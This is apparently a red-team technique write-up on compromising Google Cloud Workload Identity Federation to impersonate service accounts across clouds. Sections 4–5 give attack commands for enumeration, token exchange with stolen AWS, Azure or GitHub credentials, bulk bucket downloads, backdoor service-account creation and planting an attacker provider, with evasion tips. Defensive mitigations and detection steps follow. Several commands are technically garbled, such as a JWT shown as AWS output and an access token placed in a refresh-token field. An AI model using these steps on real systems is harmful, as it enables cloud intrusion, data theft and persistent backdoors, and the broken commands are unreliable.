# [CROSS-CLOUD-002]: Google Cloud Identity Sync Compromise

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | CROSS-CLOUD-002 |
| **MITRE ATT&CK v18.1** | [T1484.002 - Domain Trust Modification](https://attack.mitre.org/techniques/T1484/002/) |
| **Tactic** | Privilege Escalation, Lateral Movement |
| **Platforms** | GCP, Cross-Cloud |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | All GCP API versions (Workload Identity Federation available since 2021) |
| **Patched In** | N/A |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Google Cloud Identity Sync Compromise (T1484.002) exploits misconfigurations in GCP's Workload Identity Federation (WIF) feature, which allows external workloads (AWS, Azure, GitHub, on-premises) to access GCP resources without long-lived service account keys. By default, WIF's identity pool configuration allows any authenticated identity from configured external providers to access the same GCP service account. An attacker who compromises a single external identity (e.g., AWS access key, Azure service principal) can leverage this to impersonate any GCP service account in the victim's organization. Additionally, attackers with `iam.workloadIdentityPoolProviders.update` permissions can modify existing pools to add their own external provider, enabling persistent backdoor access across all projects in the organization.

**Attack Surface:** GCP IAM Console, Workload Identity Federation configuration, Identity Pool definitions, external identity providers (OIDC, AWS), service account access bindings, GCP Organizations management, Cross-Project IAM policies.

**Business Impact:** **Cross-cloud compromise with persistent access to all GCP resources.** An attacker can assume high-privilege service accounts (e.g., Editor, Owner) in any project, access databases (Cloud SQL, Firestore, BigQuery), steal cloud storage (GCS buckets), compromise Kubernetes clusters (GKE), deploy malware via Cloud Functions/Cloud Run, and move laterally to AWS/Azure via stored credentials found on GCP resources.

**Technical Context:** WIF exploitation typically takes 15-60 minutes (enumeration + misconfiguration discovery). Detection likelihood is **medium** because external token exchange generates audit logs but may appear legitimate if mixed with normal CI/CD traffic. GCP Cloud Audit Logs record identity pool access but require specific log monitoring to detect anomalies.

### Operational Risk
- **Execution Risk:** Low – Only requires discovery of misconfigured identity pool; no authentication needed to enumerate
- **Stealth:** Medium – Token generation appears in Cloud Audit Logs under normal service patterns
- **Reversibility:** No – Requires revoking all external provider trust relationships and service account bindings

### Compliance Mappings
| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 5.1, 5.2 | IAM policies, identity federation control |
| **DISA STIG** | V-251392 | GCP Identity and Access Management configuration |
| **CISA SCuBA** | C2-4 | Identity federation security baseline |
| **NIST 800-53** | AC-2, AC-3, AC-5 | Account management, access control, separation of duties |
| **GDPR** | Art. 32, 5(1)(f) | Security of processing; integrity and confidentiality |
| **DORA** | Art. 9 | ICT security incident management for critical operators |
| **NIS2** | Art. 21(2)(c) | Cyber risk management; identity and access control |
| **ISO 27001** | A.9.1.1, A.9.2.1 | Access control policy; user authentication |
| **ISO 27005** | 8.2 | Risk assessment of cross-cloud trust relationships |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** Either (1) GCP service account with `iam.workloadIdentityPoolProviders.update` or `iam.workloadIdentityPoolProviders.create`, (2) compromised external identity (AWS key, Azure service principal, GitHub Actions token), or (3) ability to enumerate and discover misconfigured pools
- **Required Access:** Network access to GCP IAM API (googleapis.com), access to external identity provider (AWS STS, Azure login, GitHub OIDC), ability to generate tokens

**Supported Versions:**
- **GCP:** Workload Identity Federation available in all GCP organizations
- **External Providers:** AWS (GetCallerIdentity), Azure (OIDC/service principal), GitHub Actions (OIDC), on-premises OIDC providers
- **Tools:** gcloud CLI, terraform, curl, Python (google-auth library)

**Tools:**
- [gcloud CLI](https://cloud.google.com/sdk/docs/install) (2.0.0+)
- [Terraform](https://www.terraform.io/downloads) (1.0+)
- [curl](https://curl.se/download.html) (7.0+)
- [Python google-auth](https://github.com/googleapis/google-auth-library-python) (2.0+)

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### GCP IAM Console Reconnaissance

**Objective:** Identify misconfigured Workload Identity Federation pools and external provider mappings.

**Command (gcloud - Any Authenticated GCP User):**
```bash
# List all workload identity pools in the organization
gcloud iam workload-identity-pools list \
  --location=global \
  --format="table(name,displayName,disabled,state)" \
  --project=YOUR_PROJECT_ID

# Expected output:
# NAME                           DISPLAY_NAME                 DISABLED  STATE
# projects/123456789012/locations/global/workloadIdentityPools/aws-pool    AWS Pool            False     ACTIVE
# projects/123456789012/locations/global/workloadIdentityPools/github-pool  GitHub Actions Pool False     ACTIVE
```

**What to Look For:**
- Presence of workload identity pools (indicates cross-cloud setup)
- Multiple pools (increased attack surface)
- Pools that are ACTIVE (exploitable now)

**Command (gcloud - Get Pool Details):**
```bash
# Get detailed information about a pool
gcloud iam workload-identity-pools describe aws-pool \
  --location=global \
  --format=json \
  --project=YOUR_PROJECT_ID | jq '.identityProviders'

# Expected output:
# [
#   {
#     "name": "projects/123456789012/locations/global/workloadIdentityPools/aws-pool/providers/aws-provider",
#     "displayName": "AWS Provider",
#     "disabled": false,
#     "state": "ACTIVE",
#     "attributeMapping": {
#       "google.subject": "assertion.principal_arn"
#     }
#   }
# ]
```

**What This Shows:**
- External provider type (AWS, Azure, GitHub)
- Attribute mappings (how external identities map to GCP principals)
- Whether any restrictive conditions exist

**Command (gcloud - Enumerate Service Accounts with External Access):**
```bash
# Get all service accounts that external identities can assume
gcloud iam service-accounts list \
  --format="table(email,displayName)" \
  --project=YOUR_PROJECT_ID

# For each service account, check who can impersonate it
for SA in $(gcloud iam service-accounts list --format='value(email)' --project=YOUR_PROJECT_ID); do
  echo "=== $SA ==="
  gcloud iam service-accounts get-iam-policy $SA \
    --format="table(bindings[].role,bindings[].members[])" \
    --project=YOUR_PROJECT_ID
done
```

**Expected Output (Vulnerable):**
```
roles/iam.workloadIdentityUser: [
  "principalSet://goog/subject/[aws_principal_arn]",  # ANY AWS principal
]
```

**What This Means:**
- Any AWS identity matching that principal ARN can assume this service account
- If principal ARN is too broad (e.g., `arn:aws:iam::ACCOUNT:*`), EVERYONE in that AWS account can access it

---

## 5. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Exploit Misconfigured Identity Pool Default Permissions

**Supported Versions:** All GCP API versions

#### Step 1: Identify Misconfigured Pool with Overly Permissive Access

**Objective:** Find identity pools that grant access to ALL identities, not just specific ones.

**Command (gcloud - Enumerate Dangerous Defaults):**
```bash
# Check which external identities can access a given service account
gcloud iam service-accounts get-iam-policy \
  TARGET_SA@PROJECT_ID.iam.gserviceaccount.com \
  --project=PROJECT_ID \
  --format=json | jq '.bindings[] | select(.role=="roles/iam.workloadIdentityUser")'

# Expected Output (VULNERABLE):
# {
#   "role": "roles/iam.workloadIdentityUser",
#   "members": [
#     "principalSet://goog/identityPool/{POOL_ID}/google.subject/*"  # Grants access to ANY subject
#   ]
# }

# Expected Output (SECURE):
# {
#   "role": "roles/iam.workloadIdentityUser",
#   "members": [
#     "principal://iam.googleapis.com/projects/{PROJECT_ID}/locations/global/workloadIdentityPools/{POOL_ID}/subject/github_org:myorg:repo:myrepo:ref:refs/heads/main"
#   ]
# }
```

**What to Look For:**
- `principalSet://goog/identityPool/{POOL_ID}/google.subject/*` (wildcard = vulnerable)
- `principalSet://goog/identityPool/{POOL_ID}/google.subject/` without specific value (vulnerable)
- Multiple external providers linked to same service account (high-value target)

---

#### Step 2: Obtain Token from Compromised External Identity

**Objective:** Get an access token from the external identity provider (AWS, Azure, GitHub).

**Command (AWS - Generate GetCallerIdentity Request):**

If you have compromised AWS credentials:
```bash
# Set up AWS credentials (already compromised)
export AWS_ACCESS_KEY_ID="AKIAIOSFODNN7EXAMPLE"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"

# Generate signed GetCallerIdentity request (used by GCP for token verification)
curl -X POST \
  -H "Authorization: AWS4-HMAC-SHA256 ..." \
  "https://sts.amazonaws.com/?Action=GetCallerIdentity&Version=2011-06-15" \
  --aws-sigv4 "aws:amz"
```

**Command (Azure - Generate OIDC Token):**

If you have compromised Azure service principal:
```bash
# Get Azure OIDC token using service principal credentials
az login --service-principal \
  -u "CLIENT_ID" \
  -p "CLIENT_SECRET" \
  --tenant "TENANT_ID"

# Generate OIDC token for GCP
az account get-access-token --resource-type oss-rdbms --output json | jq '.accessToken'
```

**Command (GitHub Actions - Generate OIDC Token):**

If you have compromised GitHub Actions workflow:
```bash
# Inside GitHub Actions runner
curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL" \
  | jq '.token'
```

**Expected Output:**
```
eyJhbGciOiJSUzI1NiIsImtpZCI6IjEyMzQ1In0.eyJzdWIiOiJhcm46YXdzOmlhbTo6MTIzNDU2Nzg5MDEyOnJvb3QiLCJpc3MiOiJodHRwczovL3N0cy5hbWF6b25hd3MuY29tIiwiYXVkIjoiaHR0cHM6Ly9pYW1jcmVkZW50aWFscy5nb29nbGVhcGlzLmNvbSJ9.SIGNATURE
```

**What This Is:**
- A JWT (JSON Web Token) signed by the external identity provider (AWS, Azure, GitHub)
- GCP will verify this token against the external provider's public key
- Proves your identity in that external provider

---

#### Step 3: Exchange External Token for GCP Service Account Token

**Objective:** Use the external token to assume a GCP service account.

**Command (bash - Direct STS Exchange):**
```bash
# Exchange external token for GCP service account token via STS API
# This uses GCP IAM Credentials Service

EXTERNAL_TOKEN="eyJhbGciOiJSUzI1NiIsImtpZCI6IjEyMzQ1In0..."
WORKLOAD_IDENTITY_PROVIDER="projects/123456789012/locations/global/workloadIdentityPools/aws-pool/providers/aws"
SERVICE_ACCOUNT_EMAIL="HIGH_PRIVILEGE_SA@myproject.iam.gserviceaccount.com"

# Step 1: Get STS token
STS_TOKEN=$(curl -X POST \
  "https://sts.googleapis.com/v1/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
  -d "audience=//iam.googleapis.com/${WORKLOAD_IDENTITY_PROVIDER}" \
  -d "requested_token_use=access_token" \
  -d "subject_token=${EXTERNAL_TOKEN}" \
  -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
  | jq -r '.access_token')

# Step 2: Exchange STS token for service account token
SA_TOKEN=$(curl -X POST \
  "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/${SERVICE_ACCOUNT_EMAIL}:generateAccessToken" \
  -H "Authorization: Bearer ${STS_TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"lifetime":"3600s","delegates":[]}' \
  | jq -r '.accessToken')

echo "[+] Service Account Token: $SA_TOKEN"
```

**Expected Output:**
```
[+] Service Account Token: ya29.a0AfH6SMBu7zK6Z4jYkPp2C9wQ5...
```

**What This Achieves:**
- You now have a valid GCP service account token
- This token grants you the same permissions as the service account
- Token is valid for 1 hour by default

**OpSec & Evasion:**
- Token exchange generates audit logs in Cloud Audit Logs (see logs under `google.iam.credentials.v1.iamcredentials.GenerateAccessToken`)
- Appears as legitimate external CI/CD pipeline if timing aligns with scheduled runs
- **Detection likelihood: Medium** - Requires review of audit logs to detect anomalies

---

#### Step 4: Use Service Account Token to Access GCP Resources

**Objective:** Use the stolen token to perform privileged operations.

**Command (gcloud - Set up Stolen Token):**
```bash
# Create a temporary configuration with the stolen token
cat > /tmp/stolen_creds.json <<EOF
{
  "type": "authorized_user",
  "client_id": "IGNORED",
  "client_secret": "IGNORED",
  "refresh_token": "STOLEN_TOKEN_HERE"
}
EOF

# Configure gcloud to use stolen token
export GOOGLE_APPLICATION_CREDENTIALS="/tmp/stolen_creds.json"

# Verify authentication
gcloud auth list
gcloud projects list --limit 10
```

**Command (bash - Direct API Access with Stolen Token):**
```bash
# Use the token directly in API calls
SA_TOKEN="ya29.a0AfH6SMBu7zK6Z4jYkPp2C9wQ5..."

# List all GCS buckets in the organization
curl -s -H "Authorization: Bearer ${SA_TOKEN}" \
  "https://storage.googleapis.com/storage/v1/b" \
  | jq '.items[] | {name, projectNumber}'

# Download sensitive data from a bucket
curl -H "Authorization: Bearer ${SA_TOKEN}" \
  "https://storage.googleapis.com/storage/v1/b/BUCKET_NAME/o/SENSITIVE_FILE" \
  -o sensitive_file.zip

# Create a new service account (persistence)
curl -X POST \
  -H "Authorization: Bearer ${SA_TOKEN}" \
  -H "Content-Type: application/json" \
  "https://iam.googleapis.com/v1/projects/PROJECT_ID/serviceAccounts" \
  -d '{
    "accountId":"backdoor-sa",
    "displayName":"Legitimate-Looking Service Account"
  }'
```

**Expected Output:**
```json
{
  "name": "projects/PROJECT_ID/serviceAccounts/backdoor-sa@PROJECT_ID.iam.gserviceaccount.com",
  "email": "backdoor-sa@PROJECT_ID.iam.gserviceaccount.com",
  "displayName": "Legitimate-Looking Service Account"
}
```

**What This Means:**
- You've successfully created persistence in the GCP environment
- The new service account can be used for future access without re-exploiting the pool
- Backdoor account is indistinguishable from legitimate service accounts

---

### METHOD 2: Exploit Workload Identity Provider Update Permissions

**Supported Versions:** All GCP API versions

#### Step 1: Identify Account with `iam.workloadIdentityPoolProviders.update` Permission

**Objective:** Find a user or service account that can modify the identity pool provider configuration.

**Command (gcloud - Check IAM Permissions):**
```bash
# Check if current user has permission to update providers
gcloud projects get-iam-policy PROJECT_ID \
  --flatten="bindings[].members" \
  --filter="bindings.role:iam.workloadIdentityPoolProviders.*" \
  --format="table(bindings.members)"

# If compromised user/SA found:
# members: [
#   "user:admin@company.com",
#   "serviceAccount:automation@PROJECT_ID.iam.gserviceaccount.com"
# ]
```

**What to Look For:**
- Users with `roles/iam.workloadIdentityAdmin` or custom roles containing `iam.workloadIdentityPoolProviders.*` permissions
- Service accounts with these permissions (CI/CD pipelines are common targets)

---

#### Step 2: Modify External Identity Provider Configuration

**Objective:** Add your own AWS account, Azure tenant, or custom OIDC provider to the existing pool.

**Command (gcloud - Update Provider):**
```bash
# Get current provider configuration
gcloud iam workload-identity-pools providers describe aws-provider \
  --location=global \
  --workload-identity-pool=aws-pool \
  --format=json > provider.json

# Edit the configuration to include your AWS account
cat provider.json | jq '.attributeMapping.aws_account = "123456789999"' > provider_modified.json

# Apply the modification
gcloud iam workload-identity-pools providers update aws-provider \
  --location=global \
  --workload-identity-pool=aws-pool \
  --attribute-mapping='
    google.subject=assertion.principal_arn,
    aws_account=assertion.aws_account
  ' \
  --update-mask='attributeMapping'
```

**Or, using Terraform (Easier):**
```hcl
# Modify the provider in Terraform
resource "google_iam_workload_identity_pool_provider" "aws" {
  workload_identity_pool_id          = google_iam_workload_identity_pool.pool.workload_identity_pool_id
  workload_identity_pool_provider_id = "aws-provider"
  
  # ADD YOUR MALICIOUS ACCOUNT HERE
  attribute_mapping = {
    "google.subject" = "assertion.principal_arn"
    "attacker_account" = "123456789999"  # Your AWS account ID
  }
  
  attribute_condition = "assertion.aws_account in ['ORIGINAL_ACCOUNT', '123456789999']"  # Stealth: include original
}

terraform apply
```

**What This Achieves:**
- Your AWS account is now trusted by the identity pool
- Any of your AWS identities can assume the high-privilege service account
- Change is logged but may appear as routine infrastructure update

**OpSec & Evasion:**
- Modify the `attributeMapping` to include both the original and your account (appears like legitimate sync)
- Use `attribute_condition` to restrict your added account to non-sensitive roles (stealth)
- **Detection likelihood: Medium-High** - Requires audit log analysis to detect unexpected provider configuration changes

---

#### Step 3: Assume Service Account Using Your Added Provider

**Objective:** Exchange your own AWS credentials for the GCP service account token.

**Command (bash - Assume with Your Credentials):**
```bash
# Use your own AWS credentials to get GCP access
export AWS_ACCESS_KEY_ID="YOUR_AWS_KEY"
export AWS_SECRET_ACCESS_KEY="YOUR_AWS_SECRET"

# Exchange your AWS credentials for GCP token (same as METHOD 1, STEP 3)
STS_TOKEN=$(curl -X POST \
  "https://sts.googleapis.com/v1/token" \
  -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
  -d "audience=//iam.googleapis.com/projects/PROJECT_ID/locations/global/workloadIdentityPools/aws-pool/providers/aws-provider" \
  -d "requested_token_use=access_token" \
  -d "subject_token=$(aws sts get-caller-identity --query 'Arn' -o text | base64)" \
  -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
  | jq -r '.access_token')

echo "[+] Got STS token: ${STS_TOKEN:0:50}..."
```

---

## 6. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

*   **Enforce Audience-Based Conditions in Identity Pool:** Restrict which service accounts can be accessed by each external identity.
    **Applies To Versions:** All GCP

    **Manual Steps (gcloud):**
    ```bash
    # Update the identity pool to require attribute conditions
    gcloud iam workload-identity-pools update aws-pool \
      --location=global \
      --format=json \
      --update-mask='disabled' \
      --attribute-mapping='
        google.subject=assertion.principal_arn,
        aws_account=assertion.arn
      ' \
      --attribute-condition='
        assertion.aws_account == "arn:aws:iam::APPROVED_ACCOUNT:*" &&
        assertion.principal_arn == "arn:aws:iam::APPROVED_ACCOUNT:role/APPROVED_ROLE"
      '
    ```

    **Manual Steps (Terraform):**
    ```hcl
    resource "google_iam_workload_identity_pool_provider" "aws" {
      attribute_condition = "assertion.aws_account == 'arn:aws:iam::123456789012:*'"
    }
    ```

    **Validation Command:**
    ```bash
    gcloud iam workload-identity-pools providers describe aws-provider \
      --workload-identity-pool=aws-pool \
      --location=global \
      --format="get(attributeCondition)"
    ```

*   **Restrict Service Accounts from External Assumption:** Only allow specific, high-trust identities to assume sensitive service accounts.
    **Applies To Versions:** All GCP

    **Manual Steps (gcloud):**
    ```bash
    # Create restrictive IAM policy
    cat > policy.yaml <<EOF
    bindings:
    - members:
      - principalSet://goog/identityPool/aws-pool/google.subject/arn:aws:iam::APPROVED:role/APPROVED_ROLE_ONLY
      role: roles/iam.workloadIdentityUser
    - members:
      - user:admin@company.com
      role: roles/iam.workloadIdentityUser
    EOF

    # Apply the policy
    gcloud iam service-accounts set-iam-policy \
      HIGH_PRIVILEGE_SA@PROJECT_ID.iam.gserviceaccount.com \
      policy.yaml
    ```

*   **Disable Unnecessary Identity Pools:** If a pool is not actively used, disable or delete it.
    **Applies To Versions:** All GCP

    **Manual Steps:**
    ```bash
    # Disable the pool (prevents new tokens from being issued)
    gcloud iam workload-identity-pools disable aws-pool \
      --location=global
    
    # Or delete if unused
    gcloud iam workload-identity-pools delete aws-pool \
      --location=global
    ```

### Priority 2: HIGH

*   **Enforce Workload Identity Pool Audit Logging:** Enable detailed audit logs for all pool operations.
    **Manual Steps:**
    1. Go to **GCP Console** → **Logging** → **Audit Logs**
    2. Under **Admin Activity**, ensure these are **enabled**:
       - `google.iam.admin.v1.CreateServiceAccount`
       - `google.iam.credentials.v1.GenerateAccessToken`
       - `google.iam.v1.UpdateServiceAccountIamPolicy`
    3. Click **Save**

*   **Use Cloud IAM Recommender:** Regularly review Recommender insights to identify over-permissioned service accounts.
    **Manual Steps:**
    1. Go to **GCP Console** → **IAM & Admin** → **Recommender**
    2. Filter by **Type: IAM**
    3. Review recommendations for removing excessive permissions
    4. Apply recommendations one-by-one

#### Validation Command (Verify Mitigations)

```bash
# Check if attribute condition is properly set
gcloud iam workload-identity-pools providers describe aws-provider \
  --workload-identity-pool=aws-pool \
  --location=global \
  --format="get(attributeCondition)"

# Expected Output (Secure):
# assertion.aws_account == 'arn:aws:iam::APPROVED_ACCOUNT:*'

# Check service account bindings are restrictive
gcloud iam service-accounts get-iam-policy \
  HIGH_PRIVILEGE_SA@PROJECT_ID.iam.gserviceaccount.com \
  --format=json | jq '.bindings[] | select(.role=="roles/iam.workloadIdentityUser")'

# Expected Output (Secure):
# {
#   "role": "roles/iam.workloadIdentityUser",
#   "members": [
#     "principalSet://goog/identityPool/aws-pool/google.subject/arn:aws:iam::123456789012:role/APPROVED_ROLE_ONLY"
#   ]
# }
```

---

## 7. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

*   **Cloud Audit Log Events:**
    - `google.iam.credentials.v1.iamcredentials.GenerateAccessToken` - Excessive calls from unexpected identities
    - `google.iam.admin.v1.CreateWorkloadIdentityPoolProvider` - New provider added
    - `google.iam.admin.v1.UpdateWorkloadIdentityPool` - Pool modified (attribute conditions removed)
    - `google.iam.admin.v1.UpdateServiceAccountIamPolicy` - New binding for external principal

*   **Network IOCs:**
    - Outbound requests to `sts.googleapis.com` from non-CI/CD infrastructure
    - Unusual geographic origins for token exchanges
    - High-rate token generation from single external identity

*   **GCP-Specific IOCs:**
    - Service accounts being used from unexpected source IPs
    - Access patterns inconsistent with legitimate automation
    - Bulk data export operations from stolen service account

### Forensic Artifacts

*   **Cloud Audit Logs:**
    ```json
    {
      "protoPayload": {
        "methodName": "google.iam.credentials.v1.iamcredentials.GenerateAccessToken",
        "resourceName": "projects/123456789012/serviceAccounts/HIGH_PRIVILEGE_SA@PROJECT_ID.iam.gserviceaccount.com",
        "request": {
          "name": "projects/-/serviceAccounts/HIGH_PRIVILEGE_SA@PROJECT_ID.iam.gserviceaccount.com",
          "scope": ["https://www.googleapis.com/auth/cloud-platform"]
        }
      },
      "sourceIPAddress": "ATTACKER_IP",
      "principalEmail": "EXTERNAL_IDENTITY@AWS"
    }
    ```

*   **GCS Bucket Access Logs:**
    - Metadata showing object access via `impersonatedServiceAccountEmail` header
    - Download of sensitive files with unusual patterns

*   **Service Account Keys Export:**
    - Keys created for backdoor service accounts
    - Multiple key rotations in short time period

### Response Procedures

1.  **Isolate:**
    **Command (gcloud):**
    ```bash
    # Disable the compromised identity pool immediately
    gcloud iam workload-identity-pools disable aws-pool \
      --location=global

    # Revoke all external provider trust relationships
    gcloud iam workload-identity-pools providers delete aws-provider \
      --workload-identity-pool=aws-pool \
      --location=global

    # Remove suspicious bindings from service accounts
    gcloud iam service-accounts remove-iam-policy-binding \
      HIGH_PRIVILEGE_SA@PROJECT_ID.iam.gserviceaccount.com \
      --member='principalSet://goog/identityPool/aws-pool/google.subject/*' \
      --role='roles/iam.workloadIdentityUser'
    ```

2.  **Collect Evidence:**
    **Command (Export Audit Logs):**
    ```bash
    # Export audit logs for forensics
    gcloud logging read "resource.type=service_account AND protoPayload.methodName=google.iam.credentials.v1.iamcredentials.GenerateAccessToken" \
      --limit 500 \
      --format json > service_account_token_generation.json

    # Analyze for suspicious patterns
    jq '.[] | select(.protoPayload.authenticationInfo.principalEmail != "expected-sa@PROJECT_ID.iam.gserviceaccount.com") | {timestamp: .timestamp, principalEmail: .protoPayload.authenticationInfo.principalEmail, methodName: .protoPayload.methodName}' service_account_token_generation.json
    ```

3.  **Remediate:**
    **Command (Full Recovery):**
    ```bash
    # Delete backdoor service accounts created during attack
    for SA in $(gcloud iam service-accounts list --filter="displayName:Legitimate-Looking" --format='value(email)'); do
      gcloud iam service-accounts delete $SA --quiet
    done

    # Rotate all service account keys
    for SA in $(gcloud iam service-accounts list --format='value(email)'); do
      gcloud iam service-accounts keys list --iam-account=$SA \
        --filter="validAfterTime:2025-01-10T00:00:00Z" \
        --format='value(name)' | xargs -I {} gcloud iam service-accounts keys delete {} --iam-account=$SA --quiet
    done

    # Re-enable and reconfigure identity pools with restrictive settings
    gcloud iam workload-identity-pools update aws-pool \
      --location=global \
      --attribute-condition='assertion.aws_account == "arn:aws:iam::APPROVED_ONLY:*"'
    ```

---

## 8. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [REC-CLOUD-002] ROADtools Entra ID enumeration | Discover cross-cloud infrastructure |
| **2** | **Privilege Escalation** | **[CROSS-CLOUD-002]** | **Exploit misconfigured identity pool** |
| **3** | **Persistence** | [IA-EXPLOIT-003] Logic App HTTP trigger abuse | Maintain access via cloud functions |
| **4** | **Impact** | [CROSS-CLOUD-003] Multi-Cloud Service Account Abuse | Move laterally to AWS/Azure |
| **5** | **Exfiltration** | Data access via stolen service account credentials | Steal sensitive data from GCS, BigQuery |

---

## 9. REAL-WORLD EXAMPLES

### Example 1: Supply Chain Attack via Cloud Build

- **Target:** Software development organizations
- **Timeline:** 2024 (ongoing)
- **Technique Status:** ACTIVE - Attackers compromised CI/CD pipelines with default Cloud Build service accounts that were overly permissioned
- **Impact:** Access to source code repositories, deployment pipelines, container registries; ability to inject malware into builds
- **Reference:** [Orca Security - Bad.Build Vulnerability](https://orca.security/resources/blog/bad-build-google-cloud-build-potential-supply-chain-attack-vulnerability/)

### Example 2: Cross-Cloud Privilege Escalation

- **Target:** Enterprise organizations using multi-cloud (AWS + GCP)
- **Timeline:** 2023-2024
- **Technique Status:** ACTIVE - Attackers found AWS keys stored on GCP compute instances, moved laterally to AWS
- **Impact:** Access to critical AWS resources; data exfiltration; lateral movement across cloud providers
- **Reference:** [Orca Security - Cross-Cloud Provider Attacks](https://orca.security/resources/blog/cross-account-cross-provider-attack-paths/)

---

## 10. ADDITIONAL RESOURCES

- [GCP Workload Identity Federation](https://cloud.google.com/iam/docs/workload-identity-federation-overview)
- [Tenable Blog - GCP Workload Identity Federation Risks](https://www.tenable.com/blog/how-attackers-can-exploit-gcps-multicloud-workload-solution)
- [Lat Movement in GCP - Documentation](https://docs.cloud.google.com/iam/docs/best-practices-service-accounts)
- [MITRE ATT&CK T1484.002](https://attack.mitre.org/techniques/T1484/002/)

---